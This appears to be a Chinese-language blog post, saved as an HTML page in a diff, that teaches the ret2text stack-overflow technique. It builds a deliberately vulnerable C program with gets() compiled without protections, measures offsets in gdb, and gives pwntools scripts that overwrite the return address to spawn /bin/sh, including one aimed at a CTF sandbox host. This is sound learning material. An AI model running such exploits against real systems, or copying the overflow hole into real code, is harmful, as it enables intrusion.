@@ -1,0 +1,490 @@
+<!-- 博文的布局-Layout -->
+<!DOCTYPE html>
+<html>
+<head>
+<!-- 引入head标签 -->
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-sclable=0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="description" content="Cyber Security" />
+<meta name="keywords" content="blockchain security,web security,system security..." />
+<link rel="stylesheet" href="/assets/css/style.css">
+<link rel="stylesheet" href="/assets/css/media.css">
+<link rel="stylesheet" href="/assets/css/animate.min.css">
+<link rel="stylesheet" href="/assets/css/pygments/pygments_default.css">
+<link rel="stylesheet" href="/assets/css/github-markdown.css">
+<!-- SNS-icon -->
+<script src="//at.alicdn.com/t/font_856428_y9z6nq7zf5.js"></script>
+<!-- share.css -->
+<link rel="stylesheet" href="/assets/css/share.min.css">
+<!-- font -->
+<link rel="stylesheet" href="/assets/css/font.css">
+<!-- <link href="https://fonts.googleapis.com/css?family=Kaushan+Script|Pacifico|Ubuntu|Roboto+Mono|Source+Sans+Pro" rel="stylesheet"> -->
+
+<!-- Favicon -->
+<link href="/assets/profile.jpeg" rel="shortcut icon" />
+<link href="/assets/profile.jpeg" rel="apple-touch-icon-precomposed" />
+<!-- Android Lolipop Theme Color -->
+<!-- <meta name="theme-color" content="#1464FB"> -->
+<title>ret2text ROP</title>
+<!-- 百度统计 -->
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?";
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+<!-- 谷歌分析 -->
+
+
+<!-- Android Lolipop Theme Color -->
+<meta name="theme-color" content=" rgb(240,180,90) ">
+</head>
+<body>
+
+<!-- 顶部锚点 -->
+<a id="htmlup" name="htmlup"></a>
+<!-- 引入博文顶部选项 -->
+
+<header id="post-header" style="background-color:rgb(240,180,90);">
+  <div class="top-center">
+      <div class="logo">
+          <a href="/" title="my awesome webtitle" style="color: white;">Wake up neo</a>
+      </div>
+      <nav class="top-nav">
+          <ul>
+              
+                <li><a href="/" style="color: white;">首页</a></li>
+              
+                <li><a href="/tags.html" style="color: white;">标签</a></li>
+              
+                <li><a href="/timeline.html" style="color: white;">时间线</a></li>
+              
+                <li><a href="/about.html" style="color: white;">关于博主</a></li>
+              
+                <li><a href="/friendLink.html" style="color: white;">友情链接</a></li>
+              
+          </ul>
+      </nav>
+      <div id="top-boot">
+        <a href="javascript:;" id="boot1" style="display:block;" onclick="document.getElementById('boot-area').style.display='block';document.getElementById('boot1').style.display='none';document.getElementById('boot2').style.display='block';"><img src="/assets/boot_white.png" alt=""></a>
+        <a href="javascript:;" id="boot2" style="display: none;" onclick="document.getElementById('boot-area').style.display='none';document.getElementById('boot1').style.display='block';document.getElementById('boot2').style.display='none';"><img src="/assets/boot_white.png" alt=""></a>
+      </div>
+  </div>
+
+</header>
+
+
+<!-- 引入移动下拉选项 -->
+<div id="boot-area">
+    <ul>
+        
+          <a href="/"><li>首页</li></a>
+        
+          <a href="/tags.html"><li>标签</li></a>
+        
+          <a href="/timeline.html"><li>时间线</li></a>
+        
+          <a href="/about.html"><li>关于博主</li></a>
+        
+          <a href="/friendLink.html"><li>友情链接</li></a>
+        
+    </ul>
+</div>
+
+<!-- 引入博文顶部样式 -->
+<!-- 版本一 垃圾 -->
+<!-- <div class="wow fadeIn top" data-wow-duration="3.5s" >
+    <span class="wow fadeInUp" data-wow-delay="0.2s">ret2text ROP</span>
+    <span class="wow fadeInUp" data-wow-delay="0.4s"></span>
+    <span class="wow fadeInUp" data-wow-delay="0.4s"></span>
+    <span class="wow fadeInUp" data-wow-delay="0.6s">作者&nbsp;&nbsp;|&nbsp;&nbsp;true</span>
+</div> -->
+
+<!-- 版本二 可切换页面 -->
+
+<div class="post-top" style="background-color:rgb(240,180,90);">
+  <!-- 页面宽度大于800px -->
+  <div class="left-area">
+    
+      <a href="/2022/11/07/MooCakeCTX-attack.html" class="btn bounceInLeft animated" onmouseover="showLeft();this.style.color='rgb(240,180,90)';" onmouseout="goneLeft();this.style.color='rgba(0,0,0,.2)';"><</a>
+      <div id="left-tab" style="display:none;"><span class="left-san"></span><span class="left-main" style="color:rgb(240,180,90);"><sapn class="main">MooCakeCTX attack</sapn></span></div>
+    
+  </div>
+  <div class="post-titlearea">
+    <span class="wow fadeInUp" data-wow-delay="0.2s">ret2text ROP</span>
+    <!-- <span class="wow fadeInUp" data-wow-delay="0.4s"></span> -->
+    <!-- <span class="wow fadeInUp" data-wow-delay="0.4s"></span> -->
+    <!-- <span class="wow fadeInUp" data-wow-delay="0.6s">作者&nbsp;&nbsp;|&nbsp;&nbsp;true</span> -->
+  </div>
+  <div class="right-area">
+    
+      <a href="/2021/05/24/python-notes.html" class="btn bounceInRight self-animated" onmouseover="showRight();this.style.color='rgb(240,180,90)';" onmouseout="goneRight();this.style.color='rgba(0,0,0,.2)';">></a>
+      <div id="right-tab" style="display:none;"><span class="right-san"></span><span class="right-main" style="color:rgb(240,180,90);"><sapn class="main">python notes</sapn></span></div>
+    
+  </div>
+
+  <!-- 页面宽度小于800px -->
+  <div class="post-changearea">
+    
+      <a href="/2022/11/07/MooCakeCTX-attack.html" class="leftchange" style="border-right: 1px solid rgb(240,180,90);border-bottom: 2px solid rgb(240,180,90);"><span>上一篇<br><br>MooCakeCTX attack</span></a>
+    
+    
+      <a href="/2021/05/24/python-notes.html" class="rightchange" style="border-left: 1px solid rgb(240,180,90);border-bottom: 2px solid rgb(240,180,90);"><span>下一篇<br><br>python notes</span></a>
+    
+  </div>
+</div>
+
+
+<div class="markdown-body fadeInUp animated">
+
+  
+    
+      <div class="postpage-subtitle" style="border-left: 8px solid rgb(240,180,90); border-right: 8px solid rgb(240,180,90)">
+        ret2text ROP analyze by yako33!
+      </div>
+    
+  
+
+  <!-- 文章内容 -->
+  <p>[TOC]</p>
+
+<h3 id="ret2text">ret2text</h3>
+
+<h4 id="elf">ELF</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file ./pwn
+</code></pre></div></div>
+
+<p>./pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=9dc32140f0e317f9e6a59b9a226a5123e34ace21, not stripped</p>
+
+<p>在计算机科学中，是一种用于<a href="https://baike.baidu.com/item/二进制文件/996661">二进制文件</a>、<a href="https://baike.baidu.com/item/可执行文件">可执行文件</a>、<a href="https://baike.baidu.com/item/目标代码/9407934">目标代码</a>、共享库和核心转储格式文件。</p>
+
+<p>是UNIX系统实验室（<a href="https://baike.baidu.com/item/USL">USL</a>）作为应用程序二进制接口（Application Binary Interface，<a href="https://baike.baidu.com/item/ABI">ABI</a>）而开发和发布的，也是<a href="https://baike.baidu.com/item/Linux/27050">Linux</a>的主要可执行文件格式。</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>checksec pwn
+</code></pre></div></div>
+
+<p>检查保护机制——无保护机制</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CANARY    : disabled
+FORTIFY   : disabled
+NX        : disabled
+PIE       : disabled
+RELRO     : Partial
+</code></pre></div></div>
+
+<h4 id="前言">前言</h4>
+
+<p>关于栈溢出漏洞主要的利用方式是ROP(Return Oriented Programming)，即返回导向编程，通过栈溢出内容覆盖返回地址，使其跳转到我们想要执行恶意代码的位置中。而跳转的目标有可能是一段本就已经写好的可以执行恶意命令的函数，也有可能是某个全局变量空间，甚至构造一个系统调用的cpu指令，跳转到一个libc中的函数等。最终目的都是执行恶意命令。计算机发展迭代中对于栈溢出的保护手段也越来越完善，限于ALSR，PIP等等，本文对基础的栈溢出进行一些简单的学习。</p>
+
+<h4 id="ret2text原理">ret2text原理</h4>
+
+<p>控制返回地址指向程序本身已有的的代码(.text)并执行</p>
+
+<pre><code class="language-C++">#include &lt;stdlib.h&gt;
+int sys(){
+	system("/bin/sh");
+}
+int func(){
+	char a[10];
+	gets(a);
+	puts(a);
+}
+int main(){
+	func();
+}	
+</code></pre>
+
+<p>vim ret2.c编辑一个简单C文件</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc -g -fno-stack-protector -no-pie -o ret2 ret2.c
+</code></pre></div></div>
+
+<p>无保护编译，-fno关闭所有栈帧保护</p>
+
+<h4 id="分析">分析</h4>
+
+<p>从程序代码上看，分成三个部分，main,func,sys三个函数，sys函数中调用了/bin/sh，函数中，char a为[10]，</p>
+
+<p>gets() 函数的功能是从输入缓冲区中读取一个字符串存储到字符指针变量 str 所指向的内存空间。使用 gets() 时，系统会将最后“敲”的换行符从缓冲区中取出来，然后丢弃，所以缓冲区中不会遗留换行符。</p>
+
+<p>输出字符串时都使用printf，通过“%s”输出字符串,更简单的方法就是使用 puts() 函数。</p>
+
+<p>这里获取输入的char a——gets——puts</p>
+
+<p>程序中获取charA的gets函数无限制的取出char，突破char[10]的限制，造成在缓冲区取数据的时候造成程序溢出</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb ret2
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>l(L)
+</code></pre></div></div>
+
+<p>查看源代码</p>
+
+<p>b gets可以断点到gets函数</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>b 6
+</code></pre></div></div>
+
+<p>在第六行添加Int3断点</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r
+</code></pre></div></div>
+
+<p>运行程序</p>
+
+<p>第六行刚刚进入func内部，查看此时程序断下</p>
+
+<ul>
+<li style="list-style-type: none;">
+    <p><img src="http://localhost:4000/screenshot/20210604ret2textROP/1.png" alt="1" /></p>
+  </li>
+</ul>
+
+<p>查看此时的信息，断点位置，反汇编查看sys的地址</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>disassemble sys
+</code></pre></div></div>
+
+<p>入口地址为0x4005b6也就是sys的地址</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>i r rbp
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p &amp;a
+</code></pre></div></div>
+
+<p>查看当前rbp 变量a的地址</p>
+
+<ul>
+<li style="list-style-type: none;">
+    <p><img src="http://localhost:4000/screenshot/20210604ret2textROP/2.png" alt="1" /></p>
+  </li>
+</ul>
+
+<p>rbp的地址 ffde40  变量a的地址 ffde30</p>
+
+<h4 id="构造payload">构造payload</h4>
+
+<p>func的返回地址是rbp的地址+8  =  rbp+8 = 0xffde40+8 = 0xffde48</p>
+
+<p>填充a变量直到返回地址，然后讲后面的8个字节的地址改为sys的地址0x4005b6</p>
+
+<p>偏移地址=输入“A”引发程序崩溃，把崩溃地址写入Payload</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./ret2"</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x4005b6</span><span class="p">)</span>
+<span class="c1">#payload = "A" * 10
+</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<ul>
+<li style="list-style-type: none;">
+    <p><img src="http://localhost:4000/screenshot/20210604ret2textROP/3.png" alt="1" /></p>
+  </li>
+</ul>
+
+<h4 id="分析栈帧异常">分析栈帧异常</h4>
+
+<p>在溢出中，可以看到stack的分析</p>
+
+<p>gets函数重新指向main函数时，进行了push rbp的操作</p>
+
+<ul>
+<li style="list-style-type: none;">
+    <p><img src="http://localhost:4000/screenshot/20210604ret2textROP/4.png" alt="1" /></p>
+  </li>
+</ul>
+
+<p>也就是说，我们让rbp的地址，指向到sys的地址</p>
+
+<h4 id="ctf-ret2text">CTF ret2text</h4>
+
+<p>通过ida pro分析</p>
+
+<ul>
+<li style="list-style-type: none;">
+    <p><img src="http://localhost:4000/screenshot/20210604ret2textROP/5.png" alt="1" /></p>
+  </li>
+</ul>
+
+<p>这里也可以上述例子非常的像，gets函数可以引发栈溢出漏洞
+在gets函数的跟踪当中可以找到secure F5反汇编</p>
+
+<pre><code class="language-C++">int secure()
+{
+  unsigned int v0; // eax
+  int result; // eax
+  int v2; // [rsp+8h] [rbp-8h] BYREF
+  int v3; // [rsp+Ch] [rbp-4h]
+
+  v0 = time(0LL);
+  srand(v0);
+  v3 = rand();
+  __isoc99_scanf(&amp;unk_4008C8, &amp;v2);
+  result = v2;
+  if ( v3 == v2 )
+    result = system("/bin/sh");
+  return result;
+}
+</code></pre>
+
+<p>此处也调用了/bin/sh的系统命令，也就是我们需要利用这个函数，让异常引发指向他，
+需要填充垃圾数据区覆盖原本的ebp的地址，让程序指针指向rbp</p>
+
+<p>适度添加滑块以保证覆盖地址和提高exp命中率</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">host</span> <span class="o">=</span> <span class="s">'challenge-6d9543332f6f24b5.sandbox.ctfhub.com'</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">22474</span>
+<span class="c1">#p = process("./pwn")
+</span><span class="n">p</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mh">0x78</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4007b8</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>网上已有非常多的wp，此处给出，连接后查看路径下的flag文件
+代码中，python3由于数据要求，p64要求不能直接连接str，会引发EOF错误，这里使用python2，在python2中，如果由于系统原因引发错误，此处可以尝试使用p32()</p>
+
+<ul>
+<li style="list-style-type: none;">
+    <p><img src="http://localhost:4000/screenshot/20210604ret2textROP/6.png" alt="1" /></p>
+  </li>
+</ul>
+
+
+  <!-- 引入share模块 -->
+  
+  <div class="social-share-wrapper">
+    <div class="social-share"></div>
+  </div>
+
+
+<!-- share.js -->
+<script src="/assets/js/social-share.min.js"></script>
+<script>
+  socialShare('.social-share', {
+    sites: [
+      
+        'qq'
+        ,
+        
+      
+        'wechat'
+        ,
+        
+      
+        'weibo'
+        ,
+        
+      
+        'twitter'
+        ,
+        
+      
+        'facebook'
+        
+      
+    ],
+    wechatQrcodeTitle: "分享到微信朋友圈",
+    wechatQrcodeHelper: '期待在朋友圈见到这篇文章'
+  });
+</script>
+
+</div>
+
+<!-- 底部锚点 -->
+<a id="htmldown" name="htmldown"></a>
+<!-- 引入评论模块 -->
+
+
+
+    <section class="post-footer-item comment">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zNDI2OS8xMDgwNg=="></div>
+    </section>
+
+    <!-- 来必力City版安装代码 -->
+    <script type="text/javascript">
+       (function(d, s) {
+           var j, e = d.getElementsByTagName(s)[0];
+
+           if (typeof LivereTower === 'function') { return; }
+
+           j = d.createElement(s);
+           j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+           j.async = true;
+
+           e.parentNode.insertBefore(j, e);
+       })(document, 'script');
+    </script>
+    <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+    <!-- City版安装代码已完成 -->
+
+
+
+
+
+<!-- 引入goto模块 -->
+<div class="bounceInRight animated go">
+  <a title="顶部切换页面" class="gototop" href="#htmlup" target="_self">
+    <div class="box" style="font-family:'ffad_matroregular';">
+        Top
+    </div>
+  </a>
+  <a title="底部有livere评论哦" class="gotobottom" href="#htmldown" target="_self">
+    <div class="box" style="font-family:'ffad_matroregular';">
+        Foot
+    </div>
+  </a>
+</div>
+
+<!-- 引入页面底部模块 -->
+<footer id="bottom">
+  <br>
+  <span>Rookie Hacker ©
+  
+  
+    2018
+    -
+  
+  2022
+  <br>
+  Powered by <a href="https://www.jekyll.com.cn/">Jekyll</a> | <a href="https://github.com/xukimseven/HardCandy-Jekyll">HardCandy-Jekyll</a></span>
+</footer>
+
+
+<!-- 引用wow.js的动画效果 -->
+<script src="/assets/js/wow.js"></script>
+<script>
+    var wow = new WOW({
+        boxClass: 'wow',
+        animateClass: 'animated',
+        // offset: 600,
+        mobile: true,
+        live: true
+    });
+    wow.init();
+</script>
+<!-- 页面刷新回到顶部 -->
+<script>
+    window.onbeforeunload = function(){
+        //刷新后页面自动回到顶部
+        document.documentElement.scrollTop = 0;  //ie下
+        document.body.scrollTop = 0;  //非ie
+    }
+</script>
+<script src="/assets/js/main.js"></script>
+</body>
+</html>
